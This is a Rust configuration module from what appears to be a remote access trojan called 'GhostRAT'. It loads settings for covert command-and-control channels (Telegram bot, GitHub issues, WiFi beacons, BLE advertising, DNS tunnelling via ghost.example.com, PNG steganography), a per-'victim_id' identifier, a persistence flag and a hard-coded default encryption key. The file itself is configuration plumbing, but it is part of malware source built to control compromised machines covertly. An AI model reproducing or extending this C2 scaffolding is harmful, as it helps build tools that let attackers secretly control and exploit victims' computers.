//! Configuration loading with priority: CLI args > env vars > JSON file > defaults.

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use std::fs;
use tracing::warn;

/// C2 channel configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TelegramConfig {
    pub bot_token: String,
    pub chat_id: i64,
}

/// GitHub C2 configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GitHubConfig {
    pub repo_owner: String,
    pub repo_name: String,
    pub token: String,
    #[serde(default = "default_file_path")]
    pub file_path: String,
}

/// WiFi Beacon C2 configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiBeaconConfig {
    #[serde(default = "default_beacon_prefix")]
    pub prefix: String,
    #[serde(default = "default_beacon_interval")]
    pub interval_secs: u64,
}

/// BLE Advertising C2 configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BleAdvConfig {
    #[serde(default = "default_ble_adv_interval")]
    pub interval_secs: u64,
    #[serde(default = "default_ble_adv_data")]
    pub adv_data: String,
}

/// DNS Tunnel C2 configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DnsTunnelConfig {
    #[serde(default = "default_dns_domain")]
    pub domain: String,
    #[serde(default = "default_dns_interval")]
    pub interval_secs: u64,
}

/// PNG Stego C2 configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PngStegoConfig {
    #[serde(default = "default_png_path")]
    pub png_path: String,
    #[serde(default = "default_png_interval")]
    pub interval_secs: u64,
}

/// Main configuration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    pub victim_id: String,
    #[serde(default = "default_heartbeat_interval")]
    pub heartbeat_interval: u64,
    #[serde(default = "default_crypto_key")]
    pub crypto_key: String,
    #[serde(default = "default_channels")]
    pub channels: Vec<String>,
    #[serde(default)]
    pub telegram: Option<TelegramConfig>,
    #[serde(default)]
    pub github: Option<GitHubConfig>,
    #[serde(default)]
    pub persistence: bool,
    #[serde(default)]
    pub wifi_beacon: Option<WifiBeaconConfig>,
    #[serde(default)]
    pub ble_adv: Option<BleAdvConfig>,
    #[serde(default)]
    pub dns_tunnel: Option<DnsTunnelConfig>,
    #[serde(default)]
    pub png_stego: Option<PngStegoConfig>,
    /// Demo mode: print commands instead of sending
    #[serde(default)]
    pub demo: bool,
}

fn default_heartbeat_interval() -> u64 {
    60
}

fn default_crypto_key() -> String {
    "GHOSTRATV5".to_string()
}

fn default_channels() -> Vec<String> {
    vec!["telegram".to_string(), "github_issues".to_string(), "github_api".to_string()]
}

fn default_file_path() -> String {
    "commands.json".to_string()
}

fn default_beacon_prefix() -> String {
    "GHOST-".to_string()
}

fn default_beacon_interval() -> u64 {
    5
}

fn default_ble_adv_interval() -> u64 {
    3
}

fn default_ble_adv_data() -> String {
    "GHOST".to_string()
}

fn default_dns_domain() -> String {
    "ghost.example.com".to_string()
}

fn default_dns_interval() -> u64 {
    10
}

fn default_png_path() -> String {
    "ghost.png".to_string()
}

fn default_png_interval() -> u64 {
    30
}

impl Config {
    /// Load configuration with priority: CLI > env > file > defaults
    pub fn load(cli: &crate::Cli) -> Result<Self> {
        let mut config = Self::defaults();

        // 1. Load from JSON config file if specified
        if let Some(config_path) = &cli.config {
            config = Self::from_file(config_path)?;
        } else if let Some(env_path) = std::env::var_os("GHOST_CONFIG_PATH") {
            if let Some(path) = env_path.to_str() {
                if let Ok(fallback) = Self::from_file(path) {
                    config = fallback;
                }
            }
        } else {
            // Try default config locations
            for default_path in Self::default_config_paths() {
                if let Ok(fallback) = Self::from_file(&default_path) {
                    config = fallback;
                    break;
                }
            }
        }

        // 2. Override with environment variables
        if let Ok(env_channel) = std::env::var("GHOST_CHANNEL") {
            config.channels = env_channel.split(',').map(|s| s.trim().to_string()).collect();
        }
        if let Ok(env_id) = std::env::var("GHOST_VICTIM_ID") {
            config.victim_id = env_id;
        }
        if let Ok(env_key) = std::env::var("GHOST_CRYPTO_KEY") {
            config.crypto_key = env_key;
        }
        if let Ok(env_heartbeat) = std::env::var("GHOST_HEARTBEAT_INTERVAL") {
            if let Ok(interval) = env_heartbeat.parse::<u64>() {
                config.heartbeat_interval = interval;
            }
        }

        // 3. Override with CLI arguments (highest priority)
        if let Some(ref token) = cli.token {
            if let Some(ref mut telegram) = config.telegram {
                telegram.bot_token = token.clone();
            }
        }
        if let Some(chat_id) = cli.chat_id {
            if let Some(ref mut telegram) = config.telegram {
                telegram.chat_id = chat_id;
            }
        }
        if let Some(ref repo) = cli.repo {
            if let Some(ref mut github) = config.github {
                let parts: Vec<&str> = repo.split('/').collect();
                if parts.len() == 2 {
                    github.repo_owner = parts[0].to_string();
                    github.repo_name = parts[1].to_string();
                }
            }
        }
        if let Some(ref token) = cli.github_token {
            if let Some(ref mut github) = config.github {
                github.token = token.clone();
            }
        }
        if let Some(ref id) = cli.victim_id {
            config.victim_id = id.clone();
        }
        if cli.demo {
            config.demo = true;
        }

        // Ensure victim_id is never empty
        if config.victim_id.is_empty() {
            config.victim_id = uuid::Uuid::new_v4().to_string();
            warn!("Generated random victim_id: {}", config.victim_id);
        }

        Ok(config)
    }

    fn defaults() -> Self {
        Self {
            victim_id: String::new(),
            heartbeat_interval: default_heartbeat_interval(),
            crypto_key: default_crypto_key(),
            channels: default_channels(),
            telegram: None,
            github: None,
            persistence: false,
            wifi_beacon: None,
            ble_adv: None,
            dns_tunnel: None,
            png_stego: None,
            demo: false,
        }
    }

    fn from_file(path: &str) -> Result<Self> {
        let content = fs::read_to_string(path)
            .with_context(|| format!("Failed to read config file: {}", path))?;
        let config: Self = serde_json::from_str(&content)
            .with_context(|| format!("Failed to parse config file: {}", path))?;
        Ok(config)
    }

    fn default_config_paths() -> Vec<String> {
        let mut paths = Vec::new();
        if let Some(config_dir) = dirs::config_dir() {
            paths.push(config_dir.join("ghostrat").join("config.json").to_string_lossy().to_string());
        }
        paths.push("config.json".to_string());
        if let Some(home) = dirs::home_dir() {
            paths.push(home.join(".ghostrat").join("config.json").to_string_lossy().to_string());
        }
        paths
    }
}
